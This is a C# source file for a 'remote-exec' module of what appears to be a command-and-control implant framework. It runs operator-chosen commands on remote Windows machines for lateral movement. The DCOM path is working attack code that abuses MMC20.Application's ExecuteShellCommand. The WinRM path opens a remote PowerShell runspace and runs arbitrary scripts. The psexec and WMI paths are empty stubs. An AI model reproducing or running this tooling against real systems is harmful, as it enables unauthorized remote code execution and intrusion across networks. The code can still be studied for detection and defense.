using System;
using System.Linq;
using System.Management.Automation;
using System.Management.Automation.Runspaces;
using System.Reflection;
using System.Threading.Tasks;
using DynamicEngLoading;


namespace Engineer.Commands
{
    internal class Remote_Exec : EngineerCommand
    {
        public override string Name => "remote-exec";
        private static EngineerTask currentTask { get; set; }
        public override async Task Execute(EngineerTask task)
        {
            //this will be similiar to jump but will execute a command on the remote system
            currentTask = task;
            if (task.Arguments.TryGetValue("/target", out string target))
            {
                target = target.TrimStart(' ');
                ForwardingFunctions.ForwardingFunctionWrap.FillTaskResults("Planning to jump to target \n" + target, task, EngTaskStatus.Running, TaskResponseType.String);
            }
            else
            {
                ForwardingFunctions.ForwardingFunctionWrap.FillTaskResults("error: " + "No target specified use /target <target>\n", task, EngTaskStatus.FailedWithWarnings, TaskResponseType.String);
                return;
            }
            if (task.Arguments.TryGetValue("/method", out string method))
            {
                method = method.TrimStart(' ');
                //ignoring case if the method string does not equal psexec wmi winrm tell the user invalid method and print the valid methods
                if (method.ToLower() == "psexec" || method.ToLower() == "wmi" || method.ToLower() == "winrm" || method.ToLower() == "wmi-ps" || method.ToLower() == "dcom")
                {
                    ForwardingFunctions.ForwardingFunctionWrap.FillTaskResults("Using method \n" + method, task, EngTaskStatus.Running, TaskResponseType.String);
                }
                else
                {
                    ForwardingFunctions.ForwardingFunctionWrap.FillTaskResults("error: " + "Invalid method specified, valid methods are psexec, wmi, winrm, wmi-ps, dcom\n", task, EngTaskStatus.FailedWithWarnings, TaskResponseType.String);
                    return;
                }
            }
            if (task.Arguments.TryGetValue("/command", out string command))
            {
                command = command.TrimStart(' ');
                ForwardingFunctions.ForwardingFunctionWrap.FillTaskResults("Using command \n" + command, task, EngTaskStatus.Running, TaskResponseType.String);
            }
            else
            {
                ForwardingFunctions.ForwardingFunctionWrap.FillTaskResults("error: " + "No command specified use /command <command>\n", task, EngTaskStatus.FailedWithWarnings, TaskResponseType.String);
                return;
            }
            if (task.Arguments.TryGetValue("/args", out string args))
            {
                args = args.TrimStart(' ');
                ForwardingFunctions.ForwardingFunctionWrap.FillTaskResults("Using args \n" + args, task, EngTaskStatus.Running, TaskResponseType.String);
            }
            else
            {
                ForwardingFunctions.ForwardingFunctionWrap.FillTaskResults("error: " + "No args specified use /args <args>\n", task, EngTaskStatus.FailedWithWarnings, TaskResponseType.String);
                return;
            }
            if (method == "psexec")
            {
                RemoteExecPsexec(target, command, args);
            }
            if (method == "wmi")
            {
                RemoteExecWmi(target, command, args);
            }
            if (method == "wmi-ps")
            {
                RemoteExecWMIPS(target, command, args);
            }
            if (method == "winrm")
            {
                RemoteExecWinRM(target, command, args);
            }
            if (method == "dcom")
            {
                RemoteExecDcom(target, command, args);
            }
            ForwardingFunctions.ForwardingFunctionWrap.FillTaskResults("Jumped", task, EngTaskStatus.Complete, TaskResponseType.String);
        }
        //RemoteExecPsexec 
        public static void RemoteExecPsexec(string target, string command, string args)
        {
            
        }

        //RemoteExecWmi
        public static void RemoteExecWmi(string target, string command, string args)
        {

        }

        //RemoteExecWMIPS 
        public static void RemoteExecWMIPS(string target, string command, string args)
        {

        }

        //RemoteExecDcom
        public static void RemoteExecDcom(string target, string command, string args)
        {
            string finalCommand = command + " " + args;
            // using the mmc20 com object to execute the binary on the target machine
            Type type = Type.GetTypeFromProgID("MMC20.Application", target);
            object obj = Activator.CreateInstance(type);
            var doc = obj.GetType().InvokeMember("Document", BindingFlags.GetProperty, null, obj, null);

            var view = doc.GetType().InvokeMember("ActiveView", BindingFlags.GetProperty, null, doc, null);
            view.GetType().InvokeMember("ExecuteShellCommand", BindingFlags.InvokeMethod, null, view, new object[] { finalCommand, null, null, "7" });
        }

        //remoteExecWinRM  
        public static void RemoteExecWinRM(string target, string command, string args)
        {
            var uri = new Uri($"http://{target}:5985/WSMAN");
            var conn = new WSManConnectionInfo(uri);
            if (conn.ConnectionUri != null)
            {
                ForwardingFunctions.ForwardingFunctionWrap.FillTaskResults("Successfully connected to target machine at \n" + conn.ConnectionUri, currentTask, EngTaskStatus.Running, TaskResponseType.String);
            }
            string finalCommand = command + " " + args;
            var runsapce = RunspaceFactory.CreateRunspace(conn);
            runsapce.Open();
            bool NoErrors =  RunPs(finalCommand, ref runsapce, out string output);
            if (NoErrors)
            {
                ForwardingFunctions.ForwardingFunctionWrap.FillTaskResults("Output: \n" + output, currentTask, EngTaskStatus.Running, TaskResponseType.String);
            }
            else
            {
                ForwardingFunctions.ForwardingFunctionWrap.FillTaskResults("Error: \n" + output, currentTask, EngTaskStatus.CompleteWithErrors, TaskResponseType.String);
            }

        }

        //runPS return string out 
        public static bool RunPs(string command,ref Runspace runspace, out string output)
        {
            {
                using (PowerShell ps = PowerShell.Create())
                {
                    ps.Runspace = runspace;
                    ps.AddScript(command);
                    var OutString = true;
                    if (OutString) { ps.AddCommand("Out-String"); }
                    PSDataCollection<object> results = new PSDataCollection<object>();
                    ps.Streams.Error.DataAdded += (sender, e) =>
                    {
                        //Console.WriteLine("Error");
                        results.Add("Error");
                        foreach (ErrorRecord er in ps.Streams.Error.ReadAll())
                        {
                            results.Add(er);
                        }
                    };
                    ps.Streams.Verbose.DataAdded += (sender, e) =>
                    {
                        foreach (VerboseRecord vr in ps.Streams.Verbose.ReadAll())
                        {
                            results.Add(vr);
                        }
                    };
                    ps.Streams.Debug.DataAdded += (sender, e) =>
                    {
                        foreach (DebugRecord dr in ps.Streams.Debug.ReadAll())
                        {
                            results.Add(dr);
                        }
                    };
                    ps.Streams.Warning.DataAdded += (sender, e) =>
                    {
                        foreach (WarningRecord wr in ps.Streams.Warning)
                        {
                            results.Add(wr);
                        }
                    };
                    ps.Invoke(null, results);
                    output = string.Join(Environment.NewLine, results.Select(R => R.ToString()).ToArray());
                    ps.Commands.Clear();
                    // Console.WriteLine(output);
                    // if output contains the string "Error" then return false
                    if (output.Contains("Error") || output.Contains("error"))
                    {
                        return false;
                    }
                    else
                    {
                        return true;
                    }
                }
            }
        }

    }
}
